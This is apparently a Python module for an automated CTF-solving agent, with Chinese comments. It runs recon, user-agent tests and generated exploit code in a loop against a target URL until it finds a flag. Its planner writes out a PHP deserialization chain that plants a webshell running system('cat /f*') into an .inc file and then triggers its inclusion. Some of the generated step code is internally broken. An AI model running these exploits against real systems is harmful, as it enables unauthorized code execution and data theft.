# -*- coding: utf-8 -*-
"""
CTF Agent 自动化决策与执行模块 v2.1
=====================================

实现全自动解题流程：
- 自动决策下一步行动
- 持续解题直到成功或明确失败
- 即时反馈与报告
- 自动保存经验

使用方式:
    from agent_core import AutoAgent

    agent = AutoAgent()
    agent.solve_challenge(
        url="https://target.com",
        hint="有没有手机"
    )
"""

import re
import json
from typing import Dict, List, Any, Optional, Callable

from tools import (
    get_memory, reset_memory, execute_python_poc, execute_command,
    extract_flags, get_memory_summary
)
from long_memory import auto_save_experience

# 引入源码分析器
try:
    from workspace.source_analyzer import analyze_php, format_analysis
    SOURCE_ANALYSIS_AVAILABLE = True
except ImportError:
    SOURCE_ANALYSIS_AVAILABLE = False


class AttackStep:
    """攻击步骤"""
    def __init__(self, name: str, description: str, code: str = "",
                 depends_on: List[str] = None, required: bool = True):
        self.name = name
        self.description = description
        self.code = code
        self.depends_on = depends_on or []
        self.required = required
        self.completed = False
        self.result = None


class AttackPlan:
    """攻击计划"""
    def __init__(self, vuln_type: str, target_url: str):
        self.vuln_type = vuln_type
        self.target_url = target_url
        self.steps: List[AttackStep] = []
        self.current_step = 0
        self.prerequisites: List[str] = []  # 攻击前提条件

    def add_step(self, step: AttackStep):
        """添加攻击步骤"""
        self.steps.append(step)

    def add_prerequisite(self, prereq: str):
        """添加攻击前提"""
        self.prerequisites.append(prereq)

    def get_next_step(self) -> Optional[AttackStep]:
        """获取下一个待执行的步骤"""
        for i, step in enumerate(self.steps):
            if not step.completed:
                # 检查依赖是否满足
                if step.depends_on:
                    deps_satisfied = all(
                        self.get_step_by_name(d).completed
                        for d in step.depends_on if self.get_step_by_name(d)
                    )
                    if not deps_satisfied:
                        continue
                self.current_step = i
                return step
        return None

    def get_step_by_name(self, name: str) -> Optional[AttackStep]:
        """通过名称获取步骤"""
        for step in self.steps:
            if step.name == name:
                return step
        return None

    def mark_step_completed(self, step_name: str, result: str = ""):
        """标记步骤完成"""
        step = self.get_step_by_name(step_name)
        if step:
            step.completed = True
            step.result = result

    def is_complete(self) -> bool:
        """检查是否所有必需步骤已完成"""
        return all(s.completed or not s.required for s in self.steps)

    def get_summary(self) -> str:
        """获取计划摘要"""
        lines = [f"[AttackPlan] {self.vuln_type} attack on {self.target_url}"]
        lines.append(f"Prerequisites: {self.prerequisites}")
        for i, step in enumerate(self.steps, 1):
            status = "✓" if step.completed else "○"
            lines.append(f"  {status} Step {i}: {step.name} - {step.description}")
        return "\n".join(lines)


class AttackPlanner:
    """
    攻击计划器

    根据漏洞类型和源码分析结果生成多步骤攻击计划
    """

    def create_plan(self, vuln_type: str, target_url: str,
                    source_analysis: Any = None) -> AttackPlan:
        """
        创建攻击计划

        Args:
            vuln_type: 漏洞类型
            target_url: 目标URL
            source_analysis: 源码分析结果

        Returns:
            AttackPlan 攻击计划对象
        """
        plan = AttackPlan(vuln_type, target_url)

        # 根据漏洞类型创建计划
        if vuln_type == "deserialization" and source_analysis:
            self._create_deserialization_plan(plan, source_analysis)
        elif vuln_type == "ua_bypass":
            self._create_ua_bypass_plan(plan)
        elif vuln_type == "sqli":
            self._create_sqli_plan(plan)
        elif vuln_type == "lfi":
            self._create_lfi_plan(plan)
        else:
            self._create_generic_plan(plan)

        return plan

    def _create_deserialization_plan(self, plan: AttackPlan, analysis: Any):
        """创建反序列化攻击计划"""
        patterns = {p.name for p in analysis.patterns}
        class_info = analysis.class_info[0] if analysis.class_info else None
        class_name = class_info.name if class_info else "main"

        # 检查是否是spl_autoload链
        has_full_chain = (
            "wakeup_config_control" in patterns and
            "destruct_file_write" in patterns and
            "destruct_with_unserialize" in patterns
        )

        if has_full_chain:
            plan.add_prerequisite("可控的unserialize_callback_func配置")
            plan.add_prerequisite("可写的.inc文件")

            # Step 1: 配置环境
            plan.add_step(AttackStep(
                name="configure_environment",
                description="设置unserialize_callback_func为spl_autoload",
                code=self._generate_step1_code(class_name),
                required=True
            ))

            # Step 2: 写入恶意代码
            plan.add_step(AttackStep(
                name="write_shell",
                description="通过__destruct写入webshell到settings.inc",
                code=self._generate_step2_code(class_name),
                depends_on=["configure_environment"],
                required=True
            ))

            # Step 3: 触发包含
            plan.add_step(AttackStep(
                name="trigger_include",
                description="反序列化不存在的类触发spl_autoload",
                code=self._generate_step3_code(class_name),
                depends_on=["write_shell"],
                required=True
            ))

            # Step 4: 验证flag
            plan.add_step(AttackStep(
                name="extract_flag",
                description="提取flag",
                depends_on=["trigger_include"],
                required=False
            ))

    def _generate_step1_code(self, class_name: str) -> str:
        """生成Step 1代码"""
        return f"""# Step 1: 配置环境 + 准备写入
import requests
import urllib.parse

base = "{class_name}"
settings = 'a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}'
# 写入PHP webshell
php_code = "<?php system('cat /f*');"
inner = f's:{{len(php_code)}}:"{{php_code}}"'

payload = f'O:4:"{class_name}":2:{{s:8:"settings";{{settings}}s:6:"params";s:{{len(inner)}}:"{{inner}}"}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step1 Status: {{r.status_code}}")
"""

    def _generate_step2_code(self, class_name: str) -> str:
        """生成Step 2代码"""
        return f"""# Step 2: 触发包含
import requests
import urllib.parse

base = "{class_name}"
# 反序列化不存在的类触发spl_autoload
payload = 'O:4:"{class_name}":2:{{s:8:"settings";a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}s:6:"params";s:19:"O:8:\"settings\":0:{{}}";}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step2 Response: {{r.text[:500]}}")
"""

    def _generate_step3_code(self, class_name: str) -> str:
        """生成Step 3代码（验证）"""
        return """# Step 3: 提取flag
import re
flags = re.findall(r'ctfshow{[^}]+}', r.text)
if flags:
    print(f"FLAG: {flags[0]}")
"""

    def _create_ua_bypass_plan(self, plan: AttackPlan):
        """创建UA绕过攻击计划"""
        plan.add_step(AttackStep(
            name="test_mobile_ua",
            description="测试Mobile UA",
            required=True
        ))
        plan.add_step(AttackStep(
            name="follow_redirect",
            description="跟随重定向",
            depends_on=["test_mobile_ua"],
            required=True
        ))

    def _create_sqli_plan(self, plan: AttackPlan):
        """创建SQL注入攻击计划"""
        plan.add_step(AttackStep(
            name="detect_sqli",
            description="检测SQL注入点",
            required=True
        ))
        plan.add_step(AttackStep(
            name="extract_data",
            description="提取数据",
            depends_on=["detect_sqli"],
            required=True
        ))

    def _create_lfi_plan(self, plan: AttackPlan):
        """创建文件包含攻击计划"""
        plan.add_step(AttackStep(
            name="test_lfi",
            description="测试文件包含",
            required=True
        ))

    def _create_generic_plan(self, plan: AttackPlan):
        """创建通用攻击计划"""
        plan.add_step(AttackStep(
            name="recon",
            description="信息收集",
            required=True
        ))
        plan.add_step(AttackStep(
            name="exploit",
            description="尝试利用",
            required=True
        ))


class AutoAgent:
    """
    全自动CTF解题Agent
    ==================

    核心设计理念：
    1. 永不中断：循环执行直到成功/明确失败
    2. 自动决策：基于输出和记忆决定下一步
    3. 即时反馈：拿到flag立即报告
    4. 自我修正：失败3次自动换策略

    Attributes:
        max_failures: 同一方法最大失败次数
        max_steps: 最大尝试步数
        verbose: 是否输出详细日志
    """

    def __init__(self, max_failures: int = 3, max_steps: int = 20, verbose: bool = True):
        self.max_failures = max_failures
        self.max_steps = max_steps
        self.verbose = verbose
        self.memory = get_memory()
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.source_analysis_result = None  # 存储源码分析结果
        self.attack_plan = None  # 存储攻击计划
        self.planner = AttackPlanner()  # 攻击计划器

    def log(self, msg: str, level: str = "INFO"):
        """输出日志"""
        if self.verbose:
            prefix = f"[{level}]" if level else ""
            print(f"{prefix} {msg}")

    def solve_challenge(self, url: str = "", hint: str = "", description: str = "",
                        source_code: str = "") -> Dict[str, Any]:
        """
        全自动解题主入口

        Args:
            url: 目标URL
            hint: 题目提示
            description: 题目描述
            source_code: PHP源码（可选，用于代码分析）

        Returns:
            解题结果
        """
        # 1. 初始化
        self.reset()
        self.target_url = url

        self.log(f"=" * 60)
        self.log(f"[Agent] 开始自动化解题: {url}")
        self.log(f"[Hint] {hint}")
        self.log(f"=" * 60)

        # 2. 自动识别类型
        if hint:
            self._classify_problem(hint)

        # 3. 如果有源码，进行代码分析
        if source_code and SOURCE_ANALYSIS_AVAILABLE:
            self._analyze_source_code(source_code)

            # 根据分析结果创建攻击计划
            if self.source_analysis_result:
                self._create_attack_plan()

        # 如果没识别出类型但分析了源码，用分析结果更新类型
        if self.target_type == "unknown" and self.source_analysis_result:
            self.target_type = self.source_analysis_result.vuln_type
            self.log(f"[Analysis] Auto-classified as: {self.target_type}")

        # 4. 循环解题
        for step_num in range(1, self.max_steps + 1):
            self.log(f"\n[Step {step_num}/{self.max_steps}] ---")

            # 3.1 决策下一步
            action = self._decide_next_action()
            self.log(f"决策: {action['type']}", "DECISION")

            # 3.2 执行POC
            try:
                result = self._execute_action(action)

                # 3.3 检查结果 - **如果发现flag立即返回**
                flags = extract_flags(result)
                if flags:
                    flag = flags[0]
                    self.log(f"=" * 60)
                    self.log(f"[SUCCESS] FLAG FOUND: {flag}", "SUCCESS")
                    self.log(f"=" * 60)

                    # **立即自动保存经验**
                    self._auto_save_experience(flag)

                    return {
                        "success": True,
                        "flag": flag,
                        "steps": step_num,
                        "message": f"步骤{step_num}: 成功获取flag"
                    }

                # 3.4 分析输出发现新线索
                clues = self._analyze_output(result)
                self.log(f"发现线索: {clues}", "ANALYSIS")

            except Exception as e:
                self.log(f"执行失败: {e}", "ERROR")
                self.memory.add_step(
                    tool=action.get("type", "unknown"),
                    target=action.get("target", ""),
                    params={},
                    result=str(e),
                    success=False
                )

            # 3.5 检查是否需要求助（失败过多或明确失败）
            if self._should_ask_for_help():
                summary = get_memory_summary()
                error_msg = self._generate_help_request(step_num, summary)

                # **立即向用户求救**
                self.log("=" * 60)
                self.log("[AGENT] 无法继续，需要人类干预！", "HELP")
                self.log("=" * 60)

                # 抛出异常中断执行，等待用户指示
                raise AgentNeedsHelpException(error_msg)

        # 4. 达到最大步数仍未成功
        raise AgentNeedsHelpException(
            f"已尝试{self.max_steps}步仍未获得flag，所有自动策略均已失败。\n\n"
            f"最终状态:\n{get_memory_summary()}"
        )

    def reset(self):
        """重置Agent状态"""
        reset_memory()
        self.memory = get_memory()
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.source_analysis_result = None
        self.attack_plan = None

    def _classify_problem(self, hint: str):
        """自动分类题目类型"""
        hint_lower = hint.lower()

        # UA相关
        if any(k in hint_lower for k in ["手机", "mobile", "ua", "user-agent", "安卓", "android", "iphone"]):
            self.target_type = "ua_bypass"
            self.problem_classified = True
            self.log("题目类型识别: User-Agent绕过", "ANALYSIS")

        # SQL注入
        elif any(k in hint_lower for k in ["sql", "注入", "database", "database", "mysql"]):
            self.target_type = "sqli"
            self.log("题目类型识别: SQL注入", "ANALYSIS")

        # 文件包含
        elif any(k in hint_lower for k in ["file", "文件", "包含", "include", "lfi", "path"]):
            self.target_type = "lfi"
            self.log("题目类型识别: 文件包含", "ANALYSIS")

        # 命令执行
        elif any(k in hint_lower for k in ["rce", "命令", "执行", "exec", "shell", "system"]):
            self.target_type = "rce"
            self.log("题目类型识别: 命令执行", "ANALYSIS")

        # SSRF
        elif any(k in hint_lower for k in ["ssrf", "内网", "gopher", "file://", "curl"]):
            self.target_type = "ssrf"
            self.log("题目类型识别: SSRF", "ANALYSIS")

    def _analyze_source_code(self, code: str) -> str:
        """
        分析PHP源码，识别漏洞和攻击链

        Args:
            code: PHP源代码

        Returns:
            分析结果文本
        """
        if not SOURCE_ANALYSIS_AVAILABLE:
            return "[Warning] Source analyzer not available"

        self.log("[Analysis] 分析PHP源码中...", "ANALYSIS")

        result = analyze_php(code)
        self.source_analysis_result = result

        # 格式化输出
        output = []
        output.append(f"\n{'='*60}")
        output.append(f"[Source Analysis] Vulnerability Type: {result.vuln_type}")
        output.append(f"{'='*60}")

        # 发现的模式
        output.append(f"\n[Detected Patterns] {len(result.patterns)} found:")
        for p in result.patterns:
            output.append(f"  • {p.name}: {p.description}")
            output.append(f"    Severity: {p.severity}, Confidence: {p.confidence}")

        # 类信息
        for cls in result.class_info:
            output.append(f"\n[Class] {cls.name}")
            output.append(f"  Magic methods: {', '.join(cls.magic_methods)}")
            output.append(f"  Dangerous calls: {[c['function'] for c in cls.dangerous_calls]}")
            output.append(f"  Controllable properties: {cls.controlled_properties}")

        # 攻击链
        if result.attack_chain:
            self.target_type = "deserialization"  # 根据分析结果更新类型
            output.append(f"\n[Attack Chain Detected!]")
            for step in result.attack_chain:
                output.append(f"  → {step}")
            self.log("[SUCCESS] Attack chain identified!")

        # POC建议
        if result.suggested_poc:
            output.append(f"\n[Suggested POC Generated]")
            output.append(result.suggested_poc[:500] + "...")

        output.append(f"{'='*60}\n")

        analysis_text = '\n'.join(output)
        self.log(analysis_text)
        return analysis_text

    def _decide_next_action(self) -> Dict[str, Any]:
        """
        决策下一步行动

        核心：优先执行攻击计划（如果有），否则基于启发式决策
        """
        steps = self.memory.steps
        target = self.target_url

        # 如果存在攻击计划，优先按步骤执行
        if self.attack_plan:
            next_step = self.attack_plan.get_next_step()
            if next_step:
                self.log(f"[AttackPlan] Executing: {next_step.name}", "PLAN")
                return {
                    "type": "attack_step",
                    "step_name": next_step.name,
                    "code": next_step.code,
                    "description": next_step.description
                }
            else:
                self.log("[AttackPlan] All steps completed")

        # 规则1: 根据题目类型直接选择策略
        if not steps:
            # 第一步：信息收集
            return {
                "type": "recon",
                "target": target,
                "description": "初始信息收集"
            }

        # 规则2: 根据题目类型决策
        if self.target_type == "ua_bypass":
            if not any(s.tool == "ua_test" for s in steps):
                return {
                    "type": "ua_test",
                    "target": target,
                    "ua": "Mobile",
                    "description": "测试Mobile UA"
                }
            # 如果前面已测试UA，跟进重定向
            last_step = steps[-1]
            if "301" in str(last_step.result) or "302" in str(last_step.result):
                redirect_url = self._extract_redirect(last_step.result)
                if redirect_url:
                    return {
                        "type": "follow_redirect",
                        "target": target + "/" + redirect_url,
                        "ua": "Mobile",
                        "description": "跟随重定向"
                    }

        # 规则3: 如果最后一个action失败，换策略
        if steps and not steps[-1].success:
            fail_count = self.memory.fail_count(steps[-1].tool, steps[-1].target)
            if fail_count >= 2:
                return {
                    "type": "explore",
                    "target": target,
                    "description": "当前方法多次失败，尝试其他方法",
                    "alternative": True
                }

        # 默认：继续侦察
        return {
            "type": "recon",
            "target": target,
            "description": "继续信息收集"
        }

    def _execute_action(self, action: Dict[str, Any]) -> str:
        """执行决策的动作"""

        action_type = action.get("type", "unknown")
        target = action.get("target", "")

        if action_type == "recon":
            # 初始侦察
            code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
resp = requests.get(url, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
# 查找重定向
if 'Location' in resp.headers:
    print(f"Redirect: {{resp.headers['Location']}}")
# 查找flag
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print(f"Content preview: {{resp.text[:500]}}")
'''
            return execute_python_poc(code, timeout=30)

        elif action_type == "ua_test":
            ua = action.get("ua", "Mobile")
            code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
if 'Location' in resp.headers:
    print(f"Redirect to: {{resp.headers['Location']}}")
# 检查内容
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG: {{flags}}")
if resp.status_code == 200:
    print(f"Content: {{resp.text}}")
'''
            return execute_python_poc(code, timeout=30)

        elif action_type == "follow_redirect":
            redirect_target = action.get("target", "")
            ua = action.get("ua", "Mobile")
            code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{redirect_target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Content-Length: {{len(resp.text)}}")
# 查找flag
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}|tfshow{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print(f"Content: {{resp.text}}")
'''
            return execute_python_poc(code, timeout=30)

        # 检查是否提供了源码
        if self.source_analysis_result and action_type == "code_available":
            code = action.get("code", "")
            result = self._analyze_source_code(code)
            self.memory.add_step(
                tool="source_analysis",
                target="PHP code",
                params={},
                result=result,
                success=True
            )
            return result

        elif action_type == "phppoc" or action_type == "poc":
            # 执行PoC（可以是单一payload或分步打击）
            steps = action.get("steps", [action.get("code")])
            results = []
            for step_code in steps:
                if step_code:
                    result = execute_python_poc(step_code, timeout=60)
                    results.append(result)
            return "\n\n".join(results)
            # 尝试其他常见方法
            return self._try_common_bypasses(target)

        else:
            return f"Unknown action type: {action_type}"

    def _try_common_bypasses(self, target: str) -> str:
        """尝试常见的绕过方法"""
        # 这里可以集成更多通用绕过策略
        return "尝试其他方法..."

    def _analyze_output(self, output: str) -> List[str]:
        """分析输出发现线索"""
        clues = []

        # 检测重定向
        if "301" in output or "302" in output:
            clues.append("redirect")

        # 检测UA相关
        if "User-Agent" in output and "Mobile" in output:
            clues.append("ua_sensitive")

        # 检测新端点
        urls = re.findall(r'/(\w+\.html?|\w+\.php)', output)
        if urls:
            clues.append(f"new_endpoint: {urls}")

        return clues

    def _extract_redirect(self, result: str) -> Optional[str]:
        """从重定向响应中提取目标URL"""
        match = re.search(r'Redirect to?:?\s*(.+)', result)
        if match:
            return match.group(1).strip().replace('/', '')
        return None

    def _should_ask_for_help(self) -> bool:
        """
        检查是否需要向用户求助
        增强版：包含失败分析和自动调整
        """
        # 获取最近的步骤
        recent_steps = self.memory.steps[-5:] if len(self.memory.steps) >= 5 else self.memory.steps

        # 分析失败类型
        fail_types = self._analyze_failures()

        # 根据失败类型决定策略
        if fail_types.get("payload_error", 0) >= 2:
            # payload错误 - 尝试模板生成的新payload
            self.log("[FAIL_ANALYSIS] Payload errors detected, trying template generation...")
            return False  # 不求助，尝试修正

        if fail_types.get("execution_error", 0) >= 2:
            # 执行环境错误 - 调整参数重试
            self.log("[FAIL_ANALYSIS] Execution errors, adjusting parameters...")
            return False

        if fail_types.get("same_error", 0) >= 3:
            # 重复相同的错误 - 确实需要帮助
            self.log("[FAIL_ANALYSIS] Repeated same error, need help")
            return True

        # 检查失败次数
        for tool in ["recon", "ua_test", "follow_redirect", "attack_step"]:
            if self.memory.fail_count(tool, self.target_url) >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Tool {tool} failed {self.max_failures}+ times")
                return True

        # 检查是否步数超限
        if len(self.memory.steps) >= self.max_steps:
            self.log(f"[FAIL_ANALYSIS] Max steps ({self.max_steps}) reached")
            return True

        return False

    def _analyze_failures(self) -> dict:
        """
        分析最近的失败模式

        Returns:
            {fail_type: count} 失败类型统计
        """
        fail_types = {
            "payload_error": 0,
            "execution_error": 0,
            "same_error": 0,
            "timeout": 0
        }

        # 获取最近失败的步骤
        failed_steps = [s for s in self.memory.steps if not s.success][-5:]

        error_signatures = []
        for step in failed_steps:
            result = str(step.result).lower()

            # 识别错误类型
            if any(x in result for x in ["syntax", "parse", "invalid", "unexpected"]):
                fail_types["payload_error"] += 1
            elif any(x in result for x in ["timeout", "time out", "connection"]):
                fail_types["execution_error"] += 1
                fail_types["timeout"] += 1
            elif "error" in result or "exception" in result:
                fail_types["execution_error"] += 1

            # 统计相同错误
            sig = result[:50]  # 取前50字符作为签名
            error_signatures.append(sig)

        # 检查重复错误
        if len(set(error_signatures)) < len(error_signatures) * 0.5:
            fail_types["same_error"] = len(error_signatures)

        return fail_types

    def _auto_adjust_strategy(self, failure_analysis: dict):
        """
        根据失败分析自动调整策略

        Args:
            failure_analysis: 失败分析结果
        """
        if failure_analysis.get("payload_error", 0) >= 2:
            # Payload有语法错误 - 使用模板生成
            if self.target_type == "deserialization":
                self.log("[STRATEGY] Switching to template-based payload generation")
                # 后续可以集成payload_templates

        if failure_analysis.get("timeout", 0) >= 2:
            # 超时 - 增加超时时间
            self.log("[STRATEGY] Increasing timeout for next attempts")
            # 标记需要更长超时

        if failure_analysis.get("same_error", 0) >= 2:
            # 相同错误 - 尝试变异
            self.log("[STRATEGY] Mutating payload parameters")

    def _auto_save_experience(self, flag: str):
        """自动保存解题经验（无需确认）"""
        try:
            # 提取步骤信息
            steps = [
                {
                    "tool": step.tool,
                    "target": step.target,
                    "success": step.success
                }
                for step in self.memory.steps
            ]

            # 提取关键技术
            techniques = list(set([
                step.tool for step in self.memory.steps if step.success
            ]))

            # 自动保存
            exp_file = auto_save_experience(
                problem_type=self.target_type,
                target=self.target_url,
                steps=steps,
                flag=flag,
                key_techniques=techniques
            )

            self.log(f"解题经验已自动保存: {exp_file}", "MEMORY")

        except Exception as e:
            self.log(f"保存经验失败: {e}", "ERROR")


# 便捷函数
def auto_solve(url: str = "", hint: str = "") -> Dict[str, Any]:
    """
    一键自动解题

    Args:
        url: 目标URL
        hint: 题目提示

    Returns:
        解题结果
    """
    agent = AutoAgent()
    return agent.solve_challenge(url=url, hint=hint)


# 测试
if __name__ == "__main__":
    # 使用说明
    print("""
TF Agent v2.1 - 自动化解题模块
==============================

使用方式:
    from agent_core import auto_solve

    # 一行代码自动解题
    result = auto_solve(
        url="https://target.com",
        hint="有手机就行"
    )

    print(result["flag"])  # 输出flag

或者:
    from agent_core import AutoAgent

    agent = AutoAgent()
    result = agent.solve_challenge(url="...", hint="...")
    """)
